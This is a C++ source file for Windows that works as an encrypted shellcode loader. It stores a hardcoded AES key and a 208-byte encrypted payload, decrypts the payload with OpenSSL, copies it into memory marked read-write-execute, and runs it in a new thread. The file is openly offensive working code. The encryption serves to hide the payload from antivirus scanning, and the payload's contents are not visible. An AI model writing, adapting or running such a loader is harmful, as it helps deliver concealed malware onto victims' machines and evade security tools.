#include <iostream>
#include <vector>
#include <openssl/aes.h>
#include <windows.h>

void handleErrors() {
    std::cerr << "An error occurred." << std::endl;
    exit(EXIT_FAILURE);
}

// Hardcoded AES key
unsigned char aesKey[16] = {
    0xC8, 0x6E, 0xF5, 0x9E, 0xD2, 0xF8, 0xDC, 0x98, 0xC0, 0x43, 0xA5, 0xD1,
	0x6B, 0xE7, 0xAE, 0x41
};

// Hardcoded encrypted payload
unsigned char payload_encrypted[208] = {
    0x39, 0x89, 0x1C, 0x67, 0x25, 0x66, 0xAB, 0x32, 0xE5, 0xE1, 0x9F, 0xF7,
	0x45, 0x6D, 0x96, 0x04, 0x22, 0x6F, 0x50, 0x40, 0x79, 0xFD, 0x35, 0x45,
	0x60, 0x50, 0x37, 0x6B, 0xC0, 0x63, 0xDA, 0x6A, 0xAC, 0xFA, 0x6A, 0xF6,
	0x92, 0x73, 0x5F, 0xEC, 0x11, 0x94, 0x28, 0x88, 0xC6, 0xDC, 0xD0, 0x7D,
	0x5E, 0x58, 0xAA, 0xC5, 0xE5, 0x30, 0x76, 0x84, 0x33, 0xE8, 0xB4, 0x21,
	0x5D, 0xE6, 0x8E, 0x14, 0xE9, 0xE6, 0x86, 0xA7, 0x64, 0xB3, 0xC9, 0xAE,
	0x4A, 0xAE, 0xBF, 0x6D, 0x86, 0x85, 0xFC, 0x1E, 0x72, 0xCA, 0xEF, 0x10,
	0xD8, 0x91, 0x29, 0x42, 0x66, 0xF7, 0x08, 0x2C, 0x96, 0x12, 0x7D, 0x7C,
	0x41, 0x74, 0x6A, 0x50, 0x17, 0x80, 0xE3, 0xFA, 0x0E, 0xAB, 0x72, 0x94,
	0x97, 0x9F, 0x68, 0x12, 0x15, 0x8C, 0xEE, 0x2D, 0x62, 0xDB, 0x03, 0x22,
	0xE1, 0x1B, 0xD8, 0x32, 0x5B, 0xDD, 0x3B, 0x5C, 0x48, 0x51, 0x78, 0xC2,
	0x71, 0x29, 0x4D, 0xDD, 0x1A, 0x5B, 0x57, 0xAD, 0xED, 0xD0, 0x8B, 0x31,
	0xD8, 0x4C, 0xA2, 0x8C, 0x48, 0x93, 0x15, 0xCC, 0x59, 0x20, 0xF0, 0x9B,
	0xA7, 0x87, 0x90, 0x88, 0x30, 0x42, 0x8D, 0xEE, 0x12, 0xB3, 0xD8, 0xBA,
	0xDE, 0xAF, 0x02, 0xEB, 0x58, 0x58, 0xE8, 0x35, 0x18, 0x02, 0xDD, 0x06,
	0x35, 0xFE, 0xFE, 0x24, 0x03, 0xD5, 0xCA, 0x12, 0x73, 0x06, 0x57, 0x24,
	0x8A, 0x09, 0x20, 0xA2, 0x72, 0x73, 0x56, 0x54, 0xD6, 0xC8, 0x29, 0xFB,
	0x63, 0xD5, 0x54, 0xA8
};

// Original length of decrypted payload
const int payload_length = 196;

void aesDecrypt(const unsigned char* key, const unsigned char* encryptedPayload, int encryptedLength, std::vector<unsigned char>& decryptedData) {
    // Create AES decryption key
    AES_KEY decKey;
    if (AES_set_decrypt_key(key, 128, &decKey) < 0) {
        handleErrors();
    }

    // Decrypt the payload
    unsigned char inBuffer[16];
    unsigned char outBuffer[16];
    std::vector<unsigned char> buffer;

    for (int i = 0; i < encryptedLength; i += 16) {
        memcpy(inBuffer, &encryptedPayload[i], 16);
        AES_decrypt(inBuffer, outBuffer, &decKey);
        buffer.insert(buffer.end(), outBuffer, outBuffer + 16);
    }

    // Truncate padding
    buffer.resize(payload_length);

    decryptedData.swap(buffer);
}

void executePayload(const std::vector<unsigned char>& payload) {
    // Allocate executable memory
    void* execMem = VirtualAlloc(NULL, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (execMem == NULL) {
        handleErrors();
    }

     // Sao chép payload vào vùng nhớ được cấp phát
    RtlMoveMemory(execMem, payload.data(), payload.size());
    
    // Tạo một thread mới để thực thi payload
    HANDLE thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)execMem, 0, 0, 0);
    
    // Chờ thread hoàn thành
    WaitForSingleObject(thread, INFINITE);
}

int main() {
    // Decrypt the payload
    std::vector<unsigned char> decryptedData;
    aesDecrypt(aesKey, payload_encrypted, sizeof(payload_encrypted), decryptedData);

    // // Debug: print decrypted data
    // std::cout << "Decrypted Data (hex): ";
    // for (unsigned char byte : decryptedData) {
    //     std::cout << std::hex << static_cast<int>(byte) << " ";
    // }
    // std::cout << std::endl;

    // Execute the decrypted payload
    executePayload(decryptedData);

    std::cout << "Payload executed." << std::endl;

    return 0;
}
